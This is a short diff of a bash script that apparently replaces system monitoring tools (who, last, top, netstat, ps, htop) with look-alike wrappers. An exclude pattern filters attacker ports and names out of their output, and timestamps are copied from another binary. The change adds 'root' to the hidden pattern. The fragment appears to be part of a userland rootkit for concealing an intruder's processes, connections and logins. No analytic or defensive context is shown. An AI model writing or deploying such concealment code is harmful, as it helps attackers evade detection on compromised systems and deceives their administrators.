@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 bins=("who" "last" "top" "netstat" "ps" "htop")
 replacewith=("what" "long" "pot" "nest" "elf" "hpot")
-exclude="mail|uucp|ssh_client|capbarb|grep|what|elf|9999|2323|1919|1212"
-TIMESTAMP_REF="/usr/bin/xargs"
+exclude="mail|uucp|ssh_client|capbarb|root|grep|what|elf|9999|2323|1919|1212"
+TIMESTAMP_REF="/usr/bin/yes"
 
 drop_script() {
     local path="$1"
